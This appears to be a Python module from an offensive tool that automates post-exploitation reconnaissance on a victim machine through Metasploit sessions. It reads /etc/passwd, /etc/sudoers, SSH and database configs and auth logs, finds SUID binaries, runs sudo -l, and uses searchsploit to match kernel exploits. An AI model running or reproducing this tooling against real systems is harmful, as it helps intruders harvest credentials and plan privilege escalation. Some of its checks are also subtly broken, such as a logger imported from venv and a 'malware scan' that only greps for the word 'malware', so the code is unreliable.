import re
import shlex
import subprocess
import time
from venv import logger
from utils.logger import nemesysLogger
import datetime

class SystemEnumerator:
    """
    A class responsible for enumerating and gathering system information from a compromised machine.

    This class performs various enumeration tasks to gather critical system details, such as OS version,
    kernel vulnerabilities, running services, network configurations, file permissions, and more.
    It interacts with the system via commands executed over a session, logging the results for later analysis.

    Attributes:
        client: The Metasploit client instance used to interact with the victim system.
        timeout: Timeout duration for waiting for command execution results (in seconds).
    """

    def __init__(self, client, timeout=30):
        """
        Initializes the SystemEnumerator class.

        Args:
            client (object): The Metasploit client instance used to interact with the victim system.
            timeout (int): The timeout for waiting for commands to execute (default is 30 seconds).
        """
        self.client = client
        self.timeout = timeout

    def _enumerate_system(self, session_id):
        """
        Performs the enumeration of the victim's system by running various commands to gather critical 
        system information.

        This method logs the results of each enumeration task into a timestamped log file to avoid overwriting.

        Args:
            session_id (str): The session ID for the active Metasploit session.
        """
        nemesysLogger.info("💀 Starting system enumeration...")

        # Generate a filename with timestamp to avoid conflicts
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_filename = f"system_enumeration_{timestamp}.log"

        # Open the log file to store command outputs
        with open(log_filename, "a") as log_file:
            # Run specific enumeration tasks
            self._enumerate_os_and_kernel(session_id, log_file)
            self._enumerate_kernel_vulnerabilities(session_id, log_file)
            self._enumerate_permissions_and_configs(session_id, log_file)
            self._inspect_running_services(session_id, log_file)
            self._check_network_configs(session_id, log_file)
            self._inspect_config_files(session_id, log_file)
            self._evaluate_insecure_binaries(session_id, log_file)
            self._identify_elevated_accounts(session_id, log_file)
            self._scan_for_malware(session_id, log_file)
            self._inspect_system_logs(session_id, log_file)
            self._check_installed_packages(session_id, log_file)
            self._check_selinux_apparmor(session_id, log_file)
            nemesysLogger.info(f"💀 System enumeration complete ✅ (Results saved in {log_filename})")

    def _enumerate_os_and_kernel(self, session_id, log_file):
        """
        Enumerates the operating system and kernel version of the victim machine.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🖥️ Enumerating OS and kernel version...")
        self._run_command(session_id, "uname -a", log_file)
        self._run_command(session_id, "cat /etc/issue", log_file)
        self._run_command(session_id, "cat /etc/*release", log_file)
        nemesysLogger.info("🖥️ OS and kernel version enumeration complete ✅")

    def _enumerate_kernel_vulnerabilities(self, session_id, log_file):
        """
        Identifies potential kernel vulnerabilities based on the current kernel version.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔍 Identifying kernel vulnerabilities...")
        kernel_version_output = self._run_command(session_id, "cat /proc/version", log_file)
        if kernel_version_output:
            kernel_version = kernel_version_output.strip()
            nemesysLogger.info(f"Kernel version: {kernel_version}")
            self._search_kernel_vulnerabilities(kernel_version, log_file)
        else:
            nemesysLogger.warning("❌ Failed to retrieve kernel version from /proc/version")
        
        nemesysLogger.info("🔍 Kernel vulnerability identification complete ✅")

    def _search_kernel_vulnerabilities(self, kernel_version, log_file):
        """
        Searches for known kernel vulnerabilities based on the kernel version using `searchsploit`.

        Args:
            kernel_version (str): The kernel version to search vulnerabilities for.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info(f"🔍 Searching for kernel vulnerabilities for version: {kernel_version}...")
        cleaned_kernel_version = self._clean_kernel_version(kernel_version)
        if cleaned_kernel_version:
            search_query = f"linux kernel {cleaned_kernel_version}"
            try:
                result = self._run_searchsploit(search_query, log_file)
                if result:
                    nemesysLogger.info(f"🔍 searchsploit results for {search_query}:\n{result}")
            except Exception as e:
                nemesysLogger.error(f"❌ Failed to run searchsploit: {e}")
        else:
            nemesysLogger.warning("❌ Invalid or empty kernel version.")

    def _clean_kernel_version(self, kernel_version):
        """
        Cleans up the kernel version string to extract only the essential version part.

        Args:
            kernel_version (str): The raw kernel version string.

        Returns:
            str: The cleaned kernel version or None if no match is found.
        """
        match = re.match(r"Linux version ([0-9]+\.[0-9]+\.[0-9]+-[0-9]+)", kernel_version)
        if match:
            return match.group(1)
        else:
            return None

    def _run_searchsploit(self, query, log_file):
        """
        Runs the `searchsploit` command to find known exploits related to the provided query.

        Args:
            query (str): The query string to search for in `searchsploit`.
            log_file (file object): The log file where command results will be saved.

        Returns:
            str: The result of the `searchsploit` query.
        """
        try:
            command = f"searchsploit {query}"
            command_list = shlex.split(command)
            result = subprocess.check_output(command_list, stderr=subprocess.STDOUT)
            result = result.decode('utf-8')
            log_file.write(f"Executed command: {command}\n")
            log_file.write(f"Output: {result}\n\n")
            return result
        except subprocess.CalledProcessError as e:
            return None
        except Exception as e:
            return None

    def _run_command(self, session_id, command, log_file):
        """
        Runs a command on the victim machine and writes the output to the log file.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            command (str): The command to execute on the victim machine.
            log_file (file object): The log file where command results will be saved.

        Returns:
            str: The output of the command execution.
        """
        shell = self.client.sessions.session(session_id)
        shell.write(command + '\n')
        time.sleep(self.timeout)  # Uses the timeout value set in the constructor
        output = shell.read()
        logger.info(f"Executed command: {command}\n")
        logger.info(f"Output: {output}\n")
        if output:
            log_file.write(f"Executed command: {command}\n")
            log_file.write(f"Output: {output}\n\n")
        return output

    def _enumerate_permissions_and_configs(self, session_id, log_file):
        """
        Enumerates sensitive permissions and configurations.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔑 Enumerating sensitive permissions and configurations...")
        self._run_command(session_id, "id", log_file)
        self._run_command(session_id, "cat /etc/passwd", log_file)
        self._run_command(session_id, "cat /etc/group", log_file)
        self._run_command(session_id, "find / -perm -4000 -type f 2>/dev/null", log_file)
        self._run_command(session_id, "sudo -l", log_file)
        nemesysLogger.info("🔑 Sensitive permissions and configurations enumeration complete ✅")

    def _inspect_running_services(self, session_id, log_file):
        """
        Inspects running processes and services.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("⚙️ Inspecting running processes and services...")
        self._run_command(session_id, "ps aux", log_file)
        self._run_command(session_id, "netstat -tulnp", log_file)
        self._run_command(session_id, "ss -tulnp", log_file)
        nemesysLogger.info("⚙️ Running processes and services inspection complete ✅")

    def _check_network_configs(self, session_id, log_file):
        """
        Checks network configuration details such as IP addresses, routes, and interfaces.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🌐 Checking network configurations...")
        self._run_command(session_id, "ifconfig", log_file)
        self._run_command(session_id, "ip a", log_file)
        self._run_command(session_id, "ip route", log_file)
        nemesysLogger.info("🌐 Network configurations check complete ✅")

    def _inspect_config_files(self, session_id, log_file):
        """
        Inspects critical configuration files for sensitive data or misconfigurations.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🛠️ Inspecting configuration files...")
        self._run_command(session_id, "cat /etc/ssh/sshd_config", log_file)
        self._run_command(session_id, "cat /etc/mysql/my.cnf", log_file)
        self._run_command(session_id, "cat /etc/apache2/apache2.conf", log_file)
        nemesysLogger.info("🛠️ Configuration files inspection complete ✅")

    def _evaluate_insecure_binaries(self, session_id, log_file):
        """
        Evaluates insecure binaries that may allow privilege escalation.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("⚠️ Evaluating insecure binaries...")
        self._run_command(session_id, "find / -type f -name '*.sh' 2>/dev/null", log_file)
        nemesysLogger.info("⚠️ Insecure binaries evaluation complete ✅")

    def _identify_elevated_accounts(self, session_id, log_file):
        """
        Identifies elevated accounts such as users with root privileges.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("👑 Identifying elevated accounts...")
        self._run_command(session_id, "cat /etc/sudoers", log_file)
        self._run_command(session_id, "getent passwd | grep -E 'root|admin|sudo'", log_file)
        nemesysLogger.info("👑 Elevated accounts identification complete ✅")

    def _scan_for_malware(self, session_id, log_file):
        """
        Scans for malware or suspicious files on the system.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("💣 Scanning for malware...")
        self._run_command(session_id, "find / -name '*.tmp' 2>/dev/null", log_file)
        self._run_command(session_id, "ps aux | grep -i 'malware'", log_file)
        nemesysLogger.info("💣 Malware scanning complete ✅")

    def _inspect_system_logs(self, session_id, log_file):
        """
        Inspects system logs for any suspicious activities.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("📜 Inspecting system logs...")
        self._run_command(session_id, "cat /var/log/auth.log", log_file)
        self._run_command(session_id, "cat /var/log/syslog", log_file)
        nemesysLogger.info("📜 System logs inspection complete ✅")

    def _check_installed_packages(self, session_id, log_file):
        """
        Checks installed packages for any known vulnerabilities or outdated software.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("📦 Checking installed packages...")
        self._run_command(session_id, "dpkg -l", log_file)
        self._run_command(session_id, "rpm -qa", log_file)
        nemesysLogger.info("📦 Installed packages check complete ✅")

    def _check_selinux_apparmor(self, session_id, log_file):
        """
        Checks if SELinux or AppArmor are enabled and configured properly.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔐 Checking SELinux/AppArmor status...")
        self._run_command(session_id, "getenforce", log_file)
        self._run_command(session_id, "aa-status", log_file)
        nemesysLogger.info("🔐 SELinux/AppArmor status check complete ✅")